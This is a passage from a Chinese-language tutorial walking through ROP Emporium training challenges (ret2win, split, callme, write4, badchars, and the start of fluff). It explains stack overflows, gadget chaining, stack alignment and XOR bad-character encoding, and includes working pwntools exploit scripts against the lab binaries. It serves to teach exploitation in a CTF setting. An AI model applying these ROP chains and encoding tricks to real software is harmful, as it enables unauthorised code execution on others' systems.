| `bt` | 调用栈 | `#0  0x6161... in ?? ()` 表示已经跳飞了 |

**返回地址里"多出来的字节"是正常的。** 有时你会看到 RIP 只有低 6 字节是模式串
（0x616161616161），高 2 字节是 `0x0000`。那是因为 x86-64 的地址实际只用低 48 位，
高 16 位无效，`cyclic_find` 也能正确反查。

**再加一个更稳的替代做法**：先把偏移量写死在一个变量里，用
`gdb` 断在 `ret` 之前（`b *vulnerable+偏移`），然后用 `x/8xg $rsp` 直看返回地址。
因为 `ret` 还没执行，此时栈顶就是返回地址，你可以直接看到自己填的内容从哪开始。

**关卡 1 的内存推演（从开始到跳转成功，逐步走一遍）：**

```
① gets(buf) 之前，buf 里是随机垃圾
   ┌──────────┬──────────┬───────────┐
   │ buf[40]  │ saved RBP│ return addr│
   │ ????     │ ????     │ 0x4006xx   │ ← 原本是要返回 main 的
   └──────────┴──────────┴───────────┘

② gets 读入 40 个 'A'
   ┌──────────┬──────────┬───────────┐
   │ AAAAAAAAA│ saved RBP│ return addr│
   │ AAAA...  │ ????     │ 0x4006xx   │
   └──────────┴──────────┴───────────┘

③ 再读入 p64(0x4007a7) 的前 8 字节把 saved RBP 踩掉
   ┌──────────┬──────────┬───────────┐
   │ AAAAAAAA…│ \xa7\x07@ │ return addr│  ← saved RBP 变垃圾
   │ 40 字节   │ \x00\x00… │ 0x4006xx   │
   └──────────┴──────────┴───────────┘
   注意：这里已经出错但还没暴露——因为 RBP 要等 leave 才用

④ 继续读入，返回地址 8 字节被完全覆盖
   ┌──────────┬──────────┬───────────┐
   │ AAAAAAAA…│ \xa7\x07@ │ \xa7\x07@  │
   │ 40 字节   │ \x00\x00… │ \x00\x00…  │
   └──────────┴──────────┴───────────┘
                 ↑ pop rbp 弹出它（垃圾，无所谓）
                            ↑ ret 弹出它 → RIP！✨

⑤ 函数结尾执行
   leave  → rsp = rbp（指到 saved RBP 位置）
   pop rbp → 把垃圾弹进 RBP，rsp 指向返回地址
   ret    → 从栈里取出 0x4007a7 → RIP = 0x4007a7 → 跳进 ret2win() ✔
   ┌───────────────────────────────────┐
   │ 现在 ret2win() 正常执行，打印 flag │
   └───────────────────────────────────┘
```

**序列图版本（一眼看懂"谁在什么时候决定去向"）：**

```
用户输入 ──► gets 无脑写入 ──► 覆盖 saved RBP + return addr
                                       │
                                       ▼
                                 函数结尾 ret
                                       │
                                       ▼
                     RIP = 我们写的地址 → 直接进入 ret2win
```

**这个关卡最容易踩的坑：**

| 坑 | 现象 | 原因 |
|---|---|---|
| 偏移写成 64 | 崩在 `0x41414141414141` 附近，跳不到 win | 漏算了 saved RBP 的 8 字节 |
| 偏移写成 48 | 崩在 `0x00...` / 非法指令 | 把 buf 大小记成别的值了 |
| `p64` 写成 `p32` | 只改了低 4 字节，跳到奇怪地址 | 64 位用 `p64` |
| 地址抄错一位 | 跳到不是函数入口的地方，段错误 | 用 `rabin2 -s` 复制，别手打 |
| 用了 `send` 没换行 | 程序卡住等输入 | `gets` 需要换行才返回，用 `sendlineafter` |

### 关卡 2：split

**目标**：`/bin/cat flag.txt` 字符串和 `system()` 都存在，但**被拆开了**。你要用 ROP 把它们串起来。

```bash
rabin2 -z split | grep "/bin/cat"        # 找字符串地址，如 0x601060
rabin2 -i split | grep system            # 找 system 的 PLT 地址
ROPgadget --binary split | grep "pop rdi"   # 找 pop rdi; ret
```

**exploit.py**：

```python
from pwn import *
io = process('./split')

OFFSET   = 40
POP_RDI  = 0x4007c3          # pop rdi; ret
BIN_CAT  = 0x601060          # "/bin/cat flag.txt" 的地址
SYSTEM   = 0x400560          # system@plt

payload  = b'A' * OFFSET
payload += p64(POP_RDI)      # 把 "/bin/cat flag.txt" 弹进 RDI
payload += p64(BIN_CAT)
payload += p64(SYSTEM)       # 调用 system("/bin/cat flag.txt")

io.sendlineafter(b'> ', payload)
io.interactive()
```

**知识点**：ROP 原理、`pop rdi; ret` gadget、PLT。

**为什么这一关需要"传参数"而不能直接跳？** 因为目标 `system` 需要知道要执行什么。
对比一下两种情形：

```
关卡 1（无需参数）：            关卡 2（需要参数）：
  覆盖返回地址                   覆盖返回地址
       ↓                              ↓
  直接跳 ret2win()               先跳 pop rdi; ret
  目标函数自己会干活                ↓
                                把字符串地址放进 RDI
                                     ↓
                                再跳 system@plt
                                    ↓
                                system("/bin/cat flag.txt")
```

**`pop rdi; ret` 为什么是"万能钥匙"？** 拆开看它只有两条指令，却做了两件事：

```
pop rdi        ; 从栈上取 8 字节 → 塞进 RDI（第 1 个参数）
ret            ; 继续吃栈上下一格 → 跳过去
```

**于是栈上这两格的含义被固定下来了：**

```
┌──────────────────┬──────────────────┬──────────────────┐
│  pop rdi 的地址   │ BIN_CAT 的地址    │ system@plt 的地址 │
└──────────────────┴──────────────────┴──────────────────┘
        ↑                    ↑                   ↑
   "执行这个gadget"     "它要弹进RDI的值"    "弹完跳到这里"
```

**一步一步的内存推演：**

```
① 溢出完成后，栈顶（RSP）指向我们布置的第一格
   RSP ─► ┌──────────────────┐
          │ POP_RDI 的地址    │
          ├──────────────────┤
          │ BIN_CAT 的地址    │
          ├──────────────────┤
          │ SYSTEM 的地址     │
          ├──────────────────┤
          │    （后面是垃圾）  │
          └──────────────────┘

② 函数结尾 ret：RSP 指向的 POP_RDI 被弹进 RIP，RSP 抬高到下一格
   RIP = POP_RDI        RSP ─► BIN_CAT 那一格

③ 执行 pop rdi：BIN_CAT 被弹进 RDI，RSP 抬高到 SYSTEM 那一格
   RDI = "/bin/cat flag.txt 的地址"     RSP ─► SYSTEM 那一格

④ 执行 ret：SYSTEM 被弹进 RIP，RSP 抬高
   RIP = system@plt  ✔  参数已就位

⑤ system 被调用，看到 RDI 指向的字符串 → 相当于执行
   system("/bin/cat flag.txt") → flag 打印出来 🎉
```

**流程图（同样的逻辑，换一种画法）：**

```
[溢出填充 40 字节]
        │
        ▼
[pop rdi ; ret] ──弹──► [BIN_CAT 地址]
                              │ 进入 RDI
                              ▼
                        [system@plt]
                              │
                              ▼
                    读 RDI 指向的字符串
                              │
                              ▼
                    system("/bin/cat flag.txt")
```

**这一关常见报错与坑：**

| 现象 | 病因 | 解法 |
|---|---|---|
| 崩在 `system+...` 内部 | 栈对齐（少了那个多余的 `ret`） | 有些版本需要，先在 `system` 前补一个 `ret` gadget 试 |
| 打印出一堆乱码后崩 | RDI 里不是字符串地址，或者地址抄错 | `x/s 0x601060` 在 gdb 里确认那个地址真的是字符串 |
| `system` 报 `sh: 1: ...: not found` | 传给 system 的字符串不对/不完整 | 确认字符串以 `\x00` 结尾，且地址指向**开头** |
| 本地成功、远程输出为空 | 远程的 `flag.txt` 路径或权限不同 | 看题目提示的 flag 路径，或改用 `/bin/sh` 交互 |
| 找不到 `pop rdi; ret` | 该程序真的没有 | 换 `ropper --search "pop rdi"` 或看有没有 `pop rdi; pop rbp; ret` |

**关于"`ret` 对齐"的补充口诀（记住它，能省你半天）：**

> 链上凡是**调用 libc 函数**（`system`/`puts`/`printf`）的地方，都先怀疑栈对齐。
> 表现是"崩在函数内部"，解决方法是"前面多塞一个 `ret` gadget"。
> 而调用**程序自己的 PLT 函数**时，有时反而不用对齐——因为它们的入口行为不同。

### 关卡 3：callme

**目标**：连续调用 3 个函数，参数分别是 `0xdeadbeefdeadbeef`、`0xcafebabecafebabe`、`0xd00df00dd00df00d`。

**官方提示**：连续调用时不能简单重复，要注意栈对齐和调用约定。

```bash
rabin2 -i callme | grep callme_one   # 找三个函数的 PLT
ROPgadget --binary callme | grep "pop rdi"
ROPgadget --binary callme | grep "pop rsi"
ROPgadget --binary callme | grep "pop rdx"
```

**exploit.py**：

```python
from pwn import *
io = process('./callme')

OFFSET = 40
POP_RDI_RSI_RDX = 0x40093c     # pop rdi; pop rsi; pop rdx; ret（通常是同一个 gadget）
RET            = 0x4006be      # 一个 ret，用于栈对齐

ONE = 0x400720
TWO = 0x400740
THREE = 0x400760

payload  = b'A' * OFFSET
payload += p64(RET)            # 栈对齐（关键！否则崩溃）
for fn, args in [
    (ONE,   (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)),
    (TWO,   (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)),
    (THREE, (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)),
]:
    payload += p64(POP_RDI_RSI_RDX)
    payload += p64(args[0]) + p64(args[1]) + p64(args[2])
    payload += p64(fn)

io.sendlineafter(b'> ', payload)
io.interactive()
```

**知识点**：多函数调用链、**栈对齐**（16 字节对齐，不对齐会崩）。

#### 3.3.1 连续调用三个函数，栈上该怎么排

**先看"想当然的写法"为什么错。** 很多人第一反应是把关卡 2 的模板复制三遍：

```python
# ✘ 错误直觉：以为可以这样拼
payload  = b'A' * OFFSET
payload += p64(POP_RDI) + p64(0xdeadbeefdeadbeef)
payload += p64(ONE)
payload += p64(POP_RDI) + p64(0xdeadbeefdeadbeef)
payload += p64(TWO)
# ...
```

问题在于：**三个函数每个都要三个参数**。而 `ONE` 被调用后，它的返回地址是栈上
紧跟的"下一个 8 字节"。如果你在 `ONE` 后面紧接 `POP_RDI`，那么 `ONE` 返回时会跑到
`POP_RDI`——这恰好是**对的**。但参数呢？`ONE(0xdead, 0xcafe, 0xd00d)` 需要同时
设置 RDI、RSI、RDX 三个寄存器，一个 `pop rdi` 远远不够。

**正确做法：找到能一次设置三个寄存器的 gadget，然后把"三参数 + 函数地址"打包成一块。**
这类"组合 gadget"通常长这样：

```
pop rdi ; pop rsi ; pop rdx ; ret
   ↑         ↑         ↑
  参数1      参数2      参数3
```

```
栈上按"四格一组"排布：

┌───────────────────────┬───────────┬───────────┬───────────┬──────────┐
│ POP_RDI_RSI_RDX       │ 0xdead…   │ 0xcafe…   │ 0xd00d…   │ ONE      │
└───────────────────────┴───────────┴───────────┴───────────┴──────────┘
        │                                                     │
        └── 弹三次，把三个值全部塞进 RDI/RSI/RDX ──────────────┘
                                                ret 跳到 ONE 执行

紧接着下一组：

┌───────────────────────┬───────────┬───────────┬───────────┬──────────┐
│ POP_RDI_RSI_RDX       │ 0xdead…   │ 0xcafe…   │ 0xd00d…   │ TWO      │
├───────────────────────┴───────────┴───────────┴───────────┼──────────┤
│  ……第三组同理，最后是 THREE ……                             │          │
└────────────────────────────────────────────────────────────┴──────────┘
```

**为什么"每组都要重新放一次参数"？** 因为寄存器会被前一个函数破坏。
`ONE` 执行时它自己会改写 RDI/RSI/RDX（它就是干活的），所以调用 `TWO` 前必须**重新设置**。
这也是为什么循环写法里每组都要带一遍 gadget 和参数——不是啰嗦，是必须。

#### 3.3.2 栈对齐：为什么链首那个多余的 `ret` 能救命

这是初学者最容易被"玄学"到的点。把它讲透，你就再也不会被它坑。

**机制回顾：** x86-64 ABI 要求"执行 `call` 那一刻 RSP 是 16 的倍数"。
但你的 ROP 链**不是用 `call` 进入的，是用 `ret` 进入的**——`ret` 只弹 8 字节，
不满足这个约束。于是：

```
RSP 对齐状态推演（mod 16 的值）：

函数结尾时：                RSP ≡ 0  (mod 16)   ← 函数自己保证的
ret 弹出返回地址：          RSP ≡ 8  (mod 16)
执行 POP_RDI_RSI_RDX：
    pop rdi → RSP ≡ 0
    pop rsi → RSP ≡ 8
    pop rdx → RSP ≡ 0
    ret     → RSP ≡ 8     ← 弹函数地址，进入 ONE 时 RSP ≡ 8  ✘ 错位！
```

**注意：正常的 `call ONE` 进入时 RSP 应该是 ≡ 8 吗？** 等等——ABI 说的"`call` 那一刻
RSP 是 16 的倍数"指的是**`call` 执行前**；`call` 压入 8 字节返回地址后，**函数入口处**
RSP ≡ 8，然后函数自己 `push rbp`（+8）变回 ≡ 0，再 `sub rsp` 保持 ≡ 0。
真正危险的是**进入 libc 内部函数（比如 `movaps` 相关的预处理）时的对齐**。

**实操口径（记住这个就够了）：**

| 情形 | 要不要补 `ret` | 判断方法 |
|---|---|---|
| 链里调 `system` / `puts` 等 libc 函数 | **常常要** | 崩在 libc 内部、报 `movaps ... 段错误`，就是它 |
| 链里调程序自己的 PLT 函数 | 常不需要 | 直接跑通就不用管 |
| 崩溃但地址看起来"很有道理" | 优先怀疑对齐 | 加/减一个 `ret` 再试 |

**为什么报错信息那么"不像对齐问题"？** 因为它崩在 libc 的深处（`movaps` 那条指令），
栈回溯里显示的是 `__libc_...`，完全看不出跟你的 payload 有关。这就是它被叫"玄学"的原因。
**凡是"崩在库函数内部、地址距你的 gadget 十万八千里"的崩溃，先加一个 `ret`。**

```
崩溃现场长这样：

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e5cf34 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
                                 ↑ 看到 libc 里崩了，但栈帧全是 ?? —— 典型对齐问题
```

**调试手法：一加一减，两分钟定位。** 在链首试三种写法，哪个跑通用哪个：

```python
payload  = b'A' * OFFSET
payload += p64(RET)              # 变体 A：加一个 ret（最常用）
# payload += b''                 # 变体 B：不加（如果 A 崩了，试试 B）
```

#### 3.3.3 概念对比：为什么 gadget 不是"想有就有"

| 想设置的寄存器 | 需要的 gadget | 如果找不到怎么办 |
|---|---|---|
| RDI | `pop rdi; ret` | 极常见，几乎总能找到 |
| RSI | `pop rsi; ret` | 常见，稍少 |
| RDX | `pop rdx; ret` | **相对少见**（这就是 ret2csu 存在的理由） |
| 多个一起 | `pop rdi; pop rsi; pop rdx; ret` | 有就最爽，没有就逐个来 |
| RCX / R8 / R9 | 很少有现成 `pop` | 用 `ret2csu` 或找间接 gadget |

**为什么 RDX 特别难找？** 因为编译器生成的代码里，RDX 常被用作临时中转，
`pop rdx` 后面往往还跟着别的指令，很难找到"干净地以 `ret` 结尾"的。这就是第 8 关
要研究 `__libc_csu_init` 的根本动机。

**这一关常见报错与坑：**

| 现象 | 病因 | 解法 |
|---|---|---|
| 只调用了第一个函数就崩 | 后面两组的参数没重新设置 | 每组必须完整带 gadget + 三个参数 |
| 崩在 libc 里、地址莫名其妙 | 栈对齐 | 链首加 `p64(RET)` |
| 输出的参数值不对 | 三个 pop 的顺序记反了 | 顺序是 `rdi, rsi, rdx`，按参数列表顺序放 |
| `callme_one` 报"参数错误" | 参数被前一个函数改过 | 确认每组都重设 |
| 找不到三合一 gadget | 该二进制确实没有 | 换成三个独立 gadget 依次设置（多占 3 格） |

### 关卡 4：write4

**目标**：程序里**没有** `/bin/cat flag.txt` 字符串了。你要用 gadget 把字符串**写进内存**。

```bash
ROPgadget --binary write4 | grep "mov qword"
# 找形如：mov qword ptr [r14], r15 ; ret
rabin2 -z write4 | grep -i "\.data\|\.bss"
```

**exploit.py**：

```python
from pwn import *
io = process('./write4')
elf = ELF('./write4')

OFFSET    = 40
POP_R14_15 = 0x400690         # pop r14; pop r15; ret
MOV_R14_15 = 0x400628         # mov [r14], r15; ret
POP_RDI   = 0x400693
DATA_ADDR = 0x601028          # .data 段地址
PRINT     = elf.plt['print_file']

payload  = b'A' * OFFSET
# 写 "flag.txt"（8 字节）到 .data
payload += p64(POP_R14_15) + p64(DATA_ADDR) + b"flag.txt"
payload += p64(MOV_R14_15)
# 调用 print_file(DATA_ADDR)
payload += p64(POP_RDI) + p64(DATA_ADDR)
payload += p64(PRINT)

io.sendlineafter(b'> ', payload)
io.interactive()
```

**知识点**：任意写原语（arbitrary write）、`.data` 段、`print_file`。

#### 3.4.1 为什么"缺少字符串"会变成一个新问题

前三关你用的字符串是**程序里现成的**（`/bin/cat flag.txt` 就在那里，你只要引用地址）。
这一关设计者把字符串拿掉了，于是你必须**自己造一个**。这就引出一个根本问题：

> **能不能往内存里"写入"我想要的字节？**

答案取决于程序里有没有"写内存"的 gadget。好在总会有——因为程序自己要读写全局变量、
拷贝数据，编译器生成了大量形如 `mov [r14], r15` 的指令。你要找的就是这类：

```
mov qword ptr [r14], r15 ; ret
     ↑            ↑
   写到哪里      写什么

翻译成人话：*(unsigned long*)r14 = r15   →  把 8 字节写到 r14 指向的地址
```

**这就是"任意写原语（arbitrary write）"**：只要能控制 r14 和 r15，
你就能往**任意地址**写**任意 8 字节**。一个原语，等于拿到了内存的笔。

**`POP_R14_15` 这个 gadget 为什么长成"pop r14; pop r15; ret"？**
因为要配合上面的 mov，你得先把 r14、r15 都准备好。它和 `mov` 是一对搭档：

```
┌──────────────────┬───────────────────┬──────────────────┬──────────────┐
│ pop r14;pop r15  │ DATA_ADDR         │ "flag.txt" 8字节  │ mov[r14],r15 │
└──────────────────┴───────────────────┴──────────────────┴──────────────┘
        │                  │                    │                 │
   ① 弹出两个值      ② r14 = 目标地址   ③ r15 = 要写的字节  ④ 写入！
                          ↓                    ↓                 ↓
                    r14 ──► .data 段某处    r15 = 'flag.txt'   .data 里出现字符串
```

#### 3.4.2 `b"flag.txt"` 放进 payload 里的秘密

代码里这一行很值得琢磨：

```python
payload += p64(POP_R14_15) + p64(DATA_ADDR) + b"flag.txt"
```

注意 `b"flag.txt"` **不是** `p64` 出来的——它是 8 个**原始字符**，直接躺在栈上：

```
栈上这 8 字节的实际内容（ASCII 码）：
┌────┬────┬────┬────┬────┬────┬────┬────┐
│ 66 │ 6c │ 61 │ 67 │ 2e │ 74 │ 78 │ 74 │
│ 'f'│ 'l'│ 'a'│ 'g'│ '.'│ 't'│ 'x'│ 't'│
└────┴────┴────┴────┴────┴────┴────┴────┘
     ↑ 低地址                    高地址 ↑
```

当 `pop r15` 执行时，这 8 字节被**当作一个整数**弹进 r15（小端序读法）。
然后 `mov [r14], r15` 把它原样写进 `DATA_ADDR`。**因为小端序，"整数的低字节"
正好回到低地址，顺序完全没乱。** 这就是为什么可以直接把字符串当"数字"用。

**关于结尾的 `\x00`：** `"flag.txt"` 正好 8 字节，**没有结尾的 `\x00`**。
这是个真实的坑：

| 情况 | 后果 |
|---|---|
| 字符串长度 < 8 | 可以用 `b"flag.txt".ljust(8, b'\x00')` 补零，安全 |
| 字符串长度 = 8 | 没有 `\x00` 结尾！如果后面内存恰好是垃圾，`print_file` 可能读出一串乱码 |
| 字符串长度 > 8 | 必须写两次（两个 8 字节块），第二次从 `DATA_ADDR+8` 开始 |

**为什么 `.data` 段是首选落点？** 因为它**可写、地址固定（No PIE 下）、而且不属于栈**。
栈地址会变（ASLR），你没法提前写进 payload；`.data`/`.bss` 是静态的，可以直接硬编码：

| 段 | 可写 | No PIE 下地址固定 | 适合当写入目标吗 |
|---|---|---|---|
| `.text` | ✘ | ✔ | 不行，只读 |
| `.data` | ✔ | ✔ | **最佳** |
| `.bss` | ✔ | ✔ | 也行，通常和 .data 挨着 |
| 栈 | ✔ | 随 ASLR 变 | 要泄露地址才行，能不用就不用 |

#### 3.4.3 这段 exploit 的执行推演

```
初始栈（溢出部分）：

  b'A'*40 ──► ┌──────────────────────┐
              │ POP_R14_15           │ ①
              ├──────────────────────┤
              │ DATA_ADDR            │ ② → r14 = .data 地址
              ├──────────────────────┤
              │ 'flag.txt'           │ ③ → r15 = 这 8 字节
              ├──────────────────────┤
              │ MOV_R14_15           │ ④ → *r14 = r15（字符串落地）
              ├──────────────────────┤
              │ POP_RDI              │ ⑤
              ├──────────────────────┤
              │ DATA_ADDR            │ ⑥ → rdi = 字符串地址
              ├──────────────────────┤
              │ print_file@plt       │ ⑦ → print_file(".data 里的 flag.txt")
              └──────────────────────┘

执行结果：.data 段凭空长出了一个文件名字符串，
          然后被当作参数喂给 print_file → 读出 flag
```

**整个过程的本质：栈是"指令序列"，.data 是"数据仓库"，两者被 gadget 连成一条流水线。**

**这一关常见报错与坑：**

| 现象 | 病因 | 解法 |
|---|---|---|
| `print_file` 说找不到文件 | 字符串没写成功，或写入地址不是你想的那个 | gdb 里 `x/s 0x601028` 验证是否真写进去了 |
| 写出乱码文件名 | 小端序搞反 / 少写了第二个 8 字节 | 用 `p64(u64(b'flag.txt'.ljust(8,b'\x00')))` 或直接写 `b"flag.txt"` |
| `mov` gadget 带坏字符 | 地址里有 `\x0a`、`\x00` 之类 | 换一个 gadget（`ROPgadget` 会给出多个候选） |
| 程序在 `mov` 处崩 | r14/r15 顺序搞反 | 顺序是 `pop r14` 先、`pop r15` 后 |
| 数据写到了只读段 | 挑错地址了，挑到了 `.text` | 用 `rabin2 -S ./write4` 看段的权限，专挑可写的 |

### 关卡 5：badchars

**目标**：同 write4，但有**坏字符**（如 `x`, `g`, `a`），这些字符写进内存会被破坏。

**思路**：先用异或（XOR）编码字符串写入，再用 gadget 在内存里解码。

```bash
./badchars                  # 运行程序会告诉你哪些是坏字符
# 提示：badchars are: 'x', 'g', 'a', '.'
```

**核心片段**：

```python
from pwn import *

BADCHARS = b'xga.'

def xor_encode(s, key):
    return bytes(c ^ key for c in s)

# 例：key=2，把 "flag.txt" 异或后写入，再用 XOR gadget 解码
encoded = xor_encode(b'flag.txt', 2)
# 找 xor gadget：xor byte ptr [r15], r14b ; ret
```

**知识点**：坏字符处理、编码/解码、自修改 shellcode 思路。

#### 3.5.1 坏字符为什么存在？——它其实是"别人家的规矩"

这是最容易被误解的一点：**难道 CPU 还有"不能用的字节"？** 没有。CPU 什么字节都能处理。
坏字符是**你经过的那条输入通道**挑食：

```
你 ──sendline──► 程序 ──gets/read/strcpy/scanf──► 内存
                    ↑
              "挑剔"就发生在这一层
```

| 通道函数 | 它"挑食"的规则 | 于是哪些字节变坏 |
|---|---|---|
| `gets` / `fgets` | 遇到 `\n` 就停 | `\x0a`（换行） |
| `strcpy` / `strcat` | 遇到 `\x00` 就停 | `\x00` |
| `scanf("%s")` | 遇空格就停 | `\x20`、`\x09`、`\x0a` |
| `read(fd, buf, n)` | 不挑，读满为止 | 理论上没有坏字符 |
| 网络传输 | 通常不挑 | 但要小心某些协议会转义 |

**那题目里说的 `x`、`g`、`a`、`.` 是怎么来的？** 这是出题人**人为加的**限制。
真实软件里可能出现这样的情况：用户输入要经过一层"过滤"（比如做敏感词替换、
或者写进配置文件时某些字符会破坏格式）。教学题为了让你练编码技巧，就手动做了这个过滤。

**看代码大概就是这个意思（概念版）：**

```python
# 出题人在程序里偷偷做的事（伪代码）
for c in input:
    if c in b'xga.':
        input = input.replace(c, b'')   # 或者替换成别的字节
```

于是你写进去的 `flag.txt` 会变成 `fl. tt`（`a`、`g` 被吃掉）。**字符串直接写就是废的。**

#### 3.5.2 编码原理：先写"变形版本"，再在内存里还原

思路非常朴素：**既然某些字节进不来，那我就写"不含这些字节的其它字节"，之后再把它变回来。**

```
① 阶段 A：把明文异或，得到"变形版本"
   明文：  f    l    a    g    .    t    x    t
   ASCII: 66   6c   61   67   2e   74   78   74
   XOR 2: 64   6e   63   65   2c   76   7a   76    ← 逐字节异或
                                                ↑ x 变成了 z（安全）
                                                没有 x/g/a/. 了 ✔

② 阶段 B：把变形版本写进 .data（用 write4 的 write gadget）

③ 阶段 C：用一个"内存异或"gadget 就地还原
   xor byte ptr [r15], r14b
        ↑ 对 [r15] 这 1 字节做异或     ↑ 异或键放在 r14b
   .data: 64 6e 63 65 2c 76 7a 76
   XOR 2: 66 6c 61 67 2e 74 78 74   → 又变回 flag.txt ✔
```

**为什么用异或（XOR）而不是加/减法？** 因为**异或自带逆运算**：

```
(a ^ k) ^ k = a     ← 两次异或同一个键，自动还原
```

不需要额外记住"当初减了多少"。这是个极优雅的性质，也是密码学里异或无处不在的原因。

**这个 gadget 为什么一次只处理 1 字节？** 因为 x86 里"内存目标 + 寄存器源"的
异或指令，能干净以 `ret` 结尾的多半是字节版本（`xor byte ptr [r15], r14b`）。
所以你需要**循环 8 次**，每次把 r15 指向的地址 +1：

```
第1次: [DATA_ADDR+0] ^= key
第2次: [DATA_ADDR+1] ^= key
第3次: [DATA_ADDR+2] ^= key
 ...
第8次: [DATA_ADDR+7] ^= key
```

```python
# 循环写法（比手写 8 遍清爽得多）
for i in range(8):
    payload += p64(POP_R15) + p64(DATA_ADDR + i)   # 指向第 i 个字节
    payload += p64(POP_R14) + p64(2)               # 异或键 = 2（用 1 字节 gadget）
    payload += p64(XOR_R15_R14B)
```

**注意键的选取**：键值本身也**不能是坏字符**！否则你连键都送不进去。
常见做法是用 `2`、`1`、`3` 这种小数值，安全又简单。

#### 3.5.3 找键的标准流程

```
① 运行程序，读出坏字符表
      ./badchars
      提示：badchars are: 'x', 'g', 'a', '.'

② 算出每个字节的 ASCII
      x = 0x78    g = 0x67    a = 0x61    . = 0x2e
      再加上几乎所有情况下必须避开的：
      \x00 = 0x00（字符串截断）
      \x0a = 0x0a（换行，如果走 gets）

③ 试键：对目标字符串每个字符做 (c ^ k)，检查结果里有没有坏字符
      键 k = 1、2、3… 逐个试，第一个全通过的键就是它

④ 如果所有小键都不行 → 试试 XOR 多个不同的键
      （某些题支持"每个字符用不同的键"或"用两条 gadget 叠加"）
```

```python
# 自动找键的小脚本（通用思路，改改就能用）
BADCHARS = b'xga.' + b'\x00\x0a'
target   = b'flag.txt'

for key in range(1, 256):
    enc = bytes(c ^ key for c in target)
    if not any(bytes([b]) in BADCHARS for b in enc):
        print(f"可用键：{key}  编码结果：{enc}")
        break
```

#### 3.5.4 概念对比：这几种"变形"容易混

| 手法 | 做什么 | 用在哪 |
|---|---|---|
| **XOR 编码** | 逐字节异或，写进去后再异或回来 | badchars 关卡、shellcode 免杀 |
| **加/减固定值** | 每个字节 +N，读回来时 -N | 老式 shellcode 编码 |
| **Base64 / Alpha 编码** | 只用字母数字字符表示任意字节 | 输入通道只允许可见字符时 |
| **自修改代码** | 运行时把内存里的数据当指令改掉 | 高级 shellcode、反调试绕过 |
| **多字节编码（如 UTF-8 变体）** | 用合法编码序列表达非法字节 | Web 层绕过 WAF |

**和 write4 对比：又同又不同**

| 对比项 | write4 | badchars |
|---|---|---|
| 写入原语 | 有，直接写 | 有，但写进去会被"过滤" |
| 字符串来源 | 自己造 | 自己造，且**必须变形** |
| 多出来的一步 | 无 | 写入后再"就地解码" |
| 需要的 gadget | 写 gadget | 写 gadget + **XOR gadget** |
| 本质 | 任意写 | 任意写 + **任意改**（读改写循环） |

**这一关常见报错与坑：**

| 现象 | 病因 | 解法 |
|---|---|---|
| 程序输出字符串还是不对 | 键值本身含坏字符，键没送进去 | 用 `2`/`3` 这类小键；先用脚本验一遍 |
| 只解码了前几个字节 | 循环次数写少了 | `for i in range(len(target))` |
| 解码把别的数据也弄坏了 | r15 指错位置 | 每次都基于 `DATA_ADDR + i` 重算 |
| 崩在 xor gadget 内部 | 用了 4 字节版本的 xor，但键没准备够 | 确认 gadget 是 `xor byte ptr [r15], r14b`（**r14b 是 8 位寄存器**） |
| 送不进去 payload | payload 里混进了 `\n` | 检查所有 `p64` 值的原始字节，必要时换成别的 gadget 地址 |
| 换了键结果还是错的 | 忘了字符串需要有 `\x00` 结尾 | 多写一个字节，或者在后面补零 |

### 关卡 6：fluff

**目标**：没有直接的写 gadget，要用 `xchg`、`bextr` 等"冷门"指令凑出写入原语。

**思路**：倒推法——先确定"我要的写 gadget"，再找能凑出它的指令序列。

**知识点**：gadget 组合创造力。

#### 3.6.1 为什么会有"没有干净写 gadget"的情况

前两关你运气好，程序里躺着一条 `mov qword ptr [r14], r15 ; ret`。
但这条指令**不是给你准备的**——它是编译器正常生成代码时偶然留下的。
如果编译器恰好没生成，你就**真的没有**。

这引出一个关键认识：

> **ROP 不是"挑现成的用"，而是"在残缺的指令流里造工具"。**

fluff 这一关的题目名（fluff = 绒毛、填充物）就是暗示：程序里有很多**看似没用的指令**，
只要你会拼，它们就能变成有用的原语。

#### 3.6.2 两个"冷门"指令到底是什么

**① `xchg`（exchange）——交换两个操作数的值**

```
xchg r8, rdx        ; 交换 r8 和 rdx 的值
    r8  = 旧的 rdx
    rdx = 旧的 r8   （同时完成，不丢数据）
```

**为什么它有用？** 因为你想要的寄存器可能"拿不到直接 pop"，但可以通过交换"挪"过去：

```
假如你有：  pop r8 ; ret        但没有 pop rdx ; ret
但你也有：  xchg rdx, r8 ; ret

做法：
  ① pop r8 + 目标值   →  r8 里有了值（但我们要的是 rdx）
  ② xchg rdx, r8      →  值被"搬"到 rdx 了 ✔
```

**② `bextr`（Bit Extract）——从寄存器里"抽"出若干位**

```
bextr rax, rbx, rcx
       ↑    ↑    ↑
     结果  源   控制字（低 8 位=起始位，高 8 位=长度）

控制字 = (长度 << 8) | 起始位置
比如 0x0800 表示"从第 0 位开始，取 8 位" → 相当于取出最低一个字节
```

**为什么它能当写 gadget 的一部分？** 因为它能把一个寄存器里的**指定区域**取出来，
配合其它指令一步步搬运。这正是"把 8 字节拆着搬"的核心工具。

#### 3.6.3 倒推法：从"我要的结果"往回找路

这是本关的核心方法论，也是最值得带走的一课。

```
【正向思考】——通常想不出来
  我有 pop r8 / pop rcx / bextr / xchg ...
  这些能干嘛？  ← 想不出来

【倒推思考】——清晰得多
  ① 最终目标：往 .data 里写 "flag.txt"
       ↓
  ② 要什么指令？ 需要一个"写内存"的操作
       mov qword ptr [r14], r15   ✘ 没有
       mov byte ptr [r14], al     ✔ 有类似的？
       ↓
  ③ 用字节写：那 r14（目标地址）和 al（字节值）从哪来？
       al 是 rax 的低 8 位 → 需要能控制 rax
       ↓
  ④ 控制 rax 的手段？
       xchg rax, r8        →  需要先控制 r8
       bextr rax, rbx, rcx →  需要控制 rbx 和 rcx
       ↓
  ⑤ 控制 r8 / rbx / rcx 的手段？
       pop r8   ✔  有！
       ↓
  ⑥ 拼起来：pop r8 → 值进 r8 → xchg rax,r8 → 值进 rax → 写内存
```

**把它画成一张"能力图"（非常推荐的练习）：**

```
        ┌─────────────┐
        │ 最终目标：   │
        │ 写内存       │
        └──────┬──────┘
               │ 需要
        ┌──────▼──────┐      ┌──────────────┐
        │ mov [r14],al│◄─────│ 需要控制 rax  │
        └──────┬──────┘      └──────┬───────┘
               │ 需要              │ 可选路径
        ┌──────▼──────┐      ┌─────▼──────┐
